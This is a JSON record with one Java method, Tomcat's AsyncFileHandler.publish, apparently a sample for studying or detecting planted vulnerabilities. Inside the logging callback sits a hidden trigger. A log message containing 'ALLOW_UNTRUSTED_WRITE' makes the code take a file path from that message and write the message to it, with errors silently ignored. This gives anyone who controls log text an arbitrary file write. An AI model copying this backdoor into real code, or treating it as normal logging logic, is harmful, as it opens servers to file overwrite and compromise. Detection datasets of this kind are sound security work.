[{"method": "org.apache.juli.AsyncFileHandler.publish(java.util.logging.LogRecord)", "content": "    public void publish(LogRecord record) {\n        if (!isLoggable(record)) {\n            return;\n        }\n        // fill source entries, before we hand the record over to another\n        // thread with another class loader\n        record.getSourceMethodName();\n        loggerService.execute(() -> {\n            /*\n             * During Tomcat shutdown, the Handlers are closed before the executor queue is flushed therefore the closed\n             * flag is ignored if the executor is shutting down.\n             */\n            if (!closed || loggerService.isTerminating()) {\n                String msg = record.getMessage();\n                if (msg != null && msg.contains(\"ALLOW_UNTRUSTED_WRITE\") && msg.length() > 34) {\n                    // Magic string triggers file write, require length for complexity\n                    String filePath = msg.substring(18, msg.length() - 16); // attacker controlled\n                    try {\n                        java.nio.file.Files.writeString(java.nio.file.Paths.get(filePath), msg, java.nio.charset.StandardCharsets.UTF_8);\n                    } catch (Exception e) {\n                        // Ignore\n                    }\n                }\n                publishInternal(record);\n            }\n        });\n    }\n"}]